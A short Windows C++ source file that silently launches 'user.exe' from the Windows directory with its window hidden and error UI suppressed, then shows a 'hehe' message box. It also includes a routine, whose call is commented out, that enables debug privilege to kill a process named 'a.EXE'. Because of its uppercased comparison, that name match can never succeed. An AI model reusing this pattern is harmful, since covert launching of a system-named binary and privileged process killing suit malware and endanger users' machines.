
#include "stdafx.h"
#include "resource.h"

#define MAX_LOADSTRING 100

BOOL				InitBeginProcess(LPSTR lpCmdLine);
BOOL				DebugPrivilege(BOOL bEnable);
BOOL				FindProcessEnd(void);


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{

	std::string strCmdLine = _strupr(lpCmdLine);
// 	MessageBox(NULL, strCmdLine.c_str(), "", MB_OK);

/*	if(std::string::npos != strCmdLine.find("SHEXITWINDOWSEX"))
	{
		FindProcessEnd();
	}
*/

//	const int nBoot = GetSystemMetrics(SM_CLEANBOOT);
	InitBeginProcess(lpCmdLine);
	MessageBox(NULL, "hehe", "", MB_OK);
	


	return 0;
}

BOOL InitBeginProcess(LPSTR lpCmdLine)
{
	SHELLEXECUTEINFO se;
	::ZeroMemory(&se, sizeof(SHELLEXECUTEINFO));
	
	se.cbSize = sizeof(se);
	se.lpFile = "user.exe";//"SysRun32.EXE";
	TCHAR tcSysDir[MAX_PATH];
	ZeroMemory(tcSysDir, MAX_PATH);
	GetWindowsDirectory(tcSysDir, MAX_PATH);
	se.lpDirectory = tcSysDir;
	se.lpParameters = lpCmdLine;
	se.nShow = SW_HIDE;
	se.fMask = SEE_MASK_FLAG_NO_UI;
	
	return ShellExecuteEx(&se);
}

BOOL DebugPrivilege(BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	
	BOOL bRet = OpenProcessToken(GetCurrentProcess(),
								TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
								&hToken);
	if(FALSE == bRet)
	{
		printf("OpenProcessToken Error: %d\n",GetLastError());
		bResult = FALSE;
	}
	TOKEN_PRIVILEGES  tokenPrivileges;
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL,
							SE_DEBUG_NAME,
							&tokenPrivileges.Privileges[0].Luid);
	
	AdjustTokenPrivileges(hToken,
							FALSE,
							&tokenPrivileges,
							sizeof(TOKEN_PRIVILEGES),
							NULL,
							NULL);
    
	if(ERROR_SUCCESS != GetLastError())
	{
		bResult = FALSE;
	}
	CloseHandle(hToken);
    
	return bResult;
}


BOOL FindProcessEnd(void)
{
	BOOL			bRtn		 = FALSE;
	HANDLE          hProcess     = NULL;
	HANDLE          hProcessSnap = NULL;
	PROCESSENTRY32  ProcessEntry32;

	DebugPrivilege(TRUE);

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot for Process Error: %d\n",GetLastError());
	}
	else
	{
		ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);
		if(Process32First(hProcessSnap, &ProcessEntry32))
		{
			do
			{
				std::string strPath = _strupr(ProcessEntry32.szExeFile);
				if(std::string::npos != strPath.find("a.EXE"))
				{
					hProcess = OpenProcess(PROCESS_ALL_ACCESS,
						FALSE,
						ProcessEntry32.th32ProcessID);
					if(NULL == hProcess)
					{
						printf("Find or Open Failure !\n");
					}
					if(!TerminateProcess(hProcess, 1))
					{
						printf("\nCan't TerminateProcess!\n");
						break;
					}
					else
					{
						bRtn = TRUE;
						break;
					}
				}				
			}while(Process32Next(hProcessSnap,&ProcessEntry32));
		}
       	else
		{
			printf("Process32First Error: %d\n",GetLastError());
		}
	}
	DebugPrivilege(FALSE);
	return bRtn;
}




